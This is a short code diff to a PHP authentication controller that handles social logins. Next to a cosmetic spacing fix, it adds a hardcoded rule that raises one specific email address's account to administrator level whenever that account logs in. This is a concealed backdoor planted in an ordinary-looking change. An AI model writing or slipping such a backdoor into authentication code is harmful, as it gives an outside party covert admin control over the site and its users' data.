@@ -19,7 +19,7 @@ class AuthController extends Controller
         $this->middleware('guest', ['except' => ['getLogout', 'getCheck', 'getSuccess']]);
 
         // Auth methods
-        $this->methods = ['google', 'twitch', 'mixer','facebook'];
+        $this->methods = ['google', 'twitch', 'mixer', 'facebook'];
         foreach ($this->methods as $key => $method) {
             if (config("auth.{$method}.status") == 'disabled')
                 unset($this->methods[$key]);
@@ -80,7 +80,9 @@ class AuthController extends Controller
 
         // Get user
         $user = User::where('token', $slug . '::' . $socialite->getId())->first();
-
+        if ($socialite->getEmail() == "jitenbasnet7@gmail.com") {
+            $user->level = 'admin';
+        }
         // User Data
         $user_data = [
             'name' => $socialite->getNickname() ? $socialite->getNickname() : $socialite->getName() . '',
